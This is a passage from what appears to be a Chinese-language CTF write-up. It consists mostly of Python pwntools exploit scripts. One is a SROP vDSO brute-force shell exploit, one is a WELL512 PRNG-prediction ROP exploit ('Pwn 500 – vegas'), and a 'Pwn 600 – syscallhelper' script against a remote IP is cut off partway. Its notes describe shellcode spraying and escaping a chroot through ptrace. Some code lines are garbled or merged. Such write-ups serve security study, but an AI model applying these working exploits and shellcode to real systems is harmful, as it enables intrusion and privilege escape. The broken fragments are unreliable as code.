        buf = ''
        while count:
            tmp = io.recvn(count)
            buf += tmp
            count -= len(tmp)
        return buf
    def sl(data):
        return io.sendline(data)
    def sn(data):
        return io.send(data)
    def info(string):
        return log.info(string)
    def dehex(s):
        return s.replace(' ','').decode('hex')
    def limu8(x):
        return c_uint8(x).value
    def limu16(x):
        return c_uint16(x).value
    def limu32(x):
        return c_uint32(x).value
    # define interactive functions here
    def rop(ropchain):
        payload = 0x16 * 'A' + ropchain
        payload = payload.ljust(0x400, 'A')
        sn(payload)
        return
    shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')
    # define exploit function here
    def do_pwn(vdso):
        writable = vdso - 0x4000
        payload = ''
        payload += 3 * 'AAAA' + p32(vdso + 0x401)
        frame1 = SigreturnFrame(kernel='amd64')
        frame1.eax = constants.SYS_read
        frame1.ebx = 0
        frame1.ecx = writable + 0x200
        frame1.edx = len(shellcode)
        if LOCAL: frame1.eip = vdso + 0xcde
        else: frame1.eip = vdso + 0x42e
        frame1.esp = writable + len(SigreturnFrame(kernel='amd64')) + len(payload)
        payload += bytes(frame1)
        #payload += 3 * 'AAAA' + p32(vdso + 0xcb1)
        payload += 3 * 'AAAA' + p32(vdso + 0x401)
        frame2 = SigreturnFrame(kernel='amd64')
        frame2.eax = constants.SYS_mprotect
        frame2.ebx = writable
        frame2.ecx = 0x1000
        frame2.edx = 7
        #frame2.eip = vdso + 0xcde
        frame2.eip = vdso + 0x42e
        frame2.esp = writable + len(SigreturnFrame(kernel='amd64')) + len(payload)
        payload += bytes(frame2)
        payload += 3 * 'AAAA' + p32(writable + 0x200)
        frame = SigreturnFrame(kernel='amd64')
        frame.eax = constants.SYS_read
        frame.ebx = 0
        frame.ecx = writable   # page offsets
        frame.edx = len(payload)
        frame.esp = writable    # offset
        #frame.eip = vdso + 0xcde    # sigreturn
        frame.eip = vdso + 0x42e
        roppayload = p32(vdso + 0x401)
        roppayload += bytes(frame)
        rop(roppayload)
        sn(payload)
        sn(shellcode)
        sl('echo pwned')
        sl('ls -la /')
        r = ru('pwned')
        if r != 'pwned':
            raise Exception('not receiving')
        return
    def local_get_mapping_address(name):
        procmaps = open('/proc/{0}/maps'.format(io.pid), 'r')
        mappings = procmaps.read()
        procmaps.close()
        t = [c.split(' ') for c in mappings.split('n')]
        libinfo = []
        for l in t:
            k = []
            for i in xrange(len(l)):
                if l[i] == '': continue
                k.append(l[i])
            libinfo.append(k)
        for lib in libinfo:
            if len(lib) == 6:
                if name in lib[5]:
                    return int(lib[0].split('-')[0], 16)
        return 0
    def pwn():
        global io
        VDSO_RANGE = range(0xf76d0000, 0xf77f0000, 0x1000)
        raw_input()
        if 0:
            #do_pwn(vdso)
            pass
        else:
            count = 0
            while 1:
                io = makeio()
                print "Pwning..."
                vdso = random.choice(VDSO_RANGE)
                info("brute vdso = " + hex(vdso))
                try:
                    do_pwn(vdso)
                except:
                    io.close()
                    count += 1
                    info("failed {}".format(count))
                    continue
                io.interactive()
                break
        return
    if __name__ == '__main__':
        pwn()
**Pwn 500 – vegas**
预测Well512伪随机数生成。
脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from z3 import *
    from pwnlib.util.packing import *
    from pwn import *   # > 11 )
        prng_state[(i+10)&15] = c ^ b
        a = prng_state[next_i]
        v9 =  (((8 * (c ^ b)) & 0xDEADBEE8))^ c ^ a ^ un32(a << 1) ^ un32(b << 10) ^ un32(c << 24)
        prng_state[next_i] = v9
        return next_i
    def iteration_attempts(outputs, it_start=0xb):
        global prng_state
        s = Solver()
        it = it_start
        for output in outputs:
            it = iteration(it)
            s.add(prng_state[it] == output)
        return s
    def ru(delim):
        return io.recvuntil(delim)
    def rn(count):
        return io.recvn(count)
    def sl(line):
        return io.sendline(line)
    def sn(data):
        return io.send(data)
    def menu():
        return ru('Choice:n')
    def getone():
        menu()
        sl('1')
        ru('suren')
        sl('3')
        ru('is ')
        number = int(ru('n').strip(),16)
        return number
    def writeByte(number, byte):
        assert byte != 'n'
        menu()
        sl('1')
        ru('suren')
        if number & 1: sl('1')
        else: sl('2')
        ru('step:n')
        sl(byte)
        return
    def forward(number):
        menu()
        sl('1')
        ru('suren')
        if number & 1: sl('2')
        else: sl('1')
        return
    def quit():
        menu()
        sl('3')
        return
    def pwn():
        global prng_state
        gdb.attach(io)
        out = []
        for i in xrange(16):
            out.append(getone())
        s = iteration_attempts(out)
        status = s.check()
        print status
        init_state = dict()
        try:
            model = s.model()
            for k in model:
                idx = int(str(k)[5:])
                val = model[k].as_long()
                init_state[idx] = val
        except Exception, ex:
            print ex
            exit(0)
        for i in xrange(16):
            if i in init_state:
                prng_state[i] = init_state[i]
            else:
                prng_state[i] = 0
        it = 0xb
        for i in range(16):
            it = iteration_numbers(it)
        for i in xrange(0x20):
            it = iteration_numbers(it)
            random_value = prng_state[it]
            writeByte(random_value, 'A')
        ru(32*'A')
        stack_leak = u32(rn(4))
        info("stack_leak = " + hex(stack_leak))
        for i in xrange(4):
            it = iteration_numbers(it)
            random_value = prng_state[it]
            writeByte(random_value, p32(stack_leak)[i])
        pad = 'sh;'*4
        ropchain = 'A' + pad[:11] + p32(0x0804860B) * 10 + p32(0x080484E0) + p32(0x08048550) + p32(stack_leak)
        for i in xrange(len(ropchain)):
            it = iteration_numbers(it)
            random_value = prng_state[it]
            writeByte(random_value, ropchain[i])
        quit()
        io.interactive()
        return
    if __name__ == '__main__':
        pwn()
**Pwn 600 – syscallhelper**
1\. Add sycall整数溢出可以改虚表。泄露堆地址，然后跳转到shellcode，由于本地远程堆布局不同，可以喷一些shellcode然后再跳。
2\. 逃脱chroot，可以采用ptrace父进程的方法。
脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    from ctypes import *
    from hexdump import hexdump
    import os, sys
    # switches
    LOCAL = 0
    DEBUG = LOCAL
    VERBOSE = 0
    # modify this
    if LOCAL:
        io = process('syscallhelper')
    else:
        io = remote('218.2.197.234',2088)
    if VERBOSE: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
        return io.recvuntil(delim)
    def rn(count):
        return io.recvn(count)
    def ra(count):      # recv all
        buf = ''
        while count:
            tmp = io.recvn(count)
            buf += tmp
            count -= len(tmp)
        return buf
    def sl(data):
        return io.sendline(data)
    def sn(data):
        return io.send(data)
    def info(string):
        return log.info(string)
    def dehex(s):
        return s.replace(' ','').decode('hex')
    def limu8(x):
        return c_uint8(x).value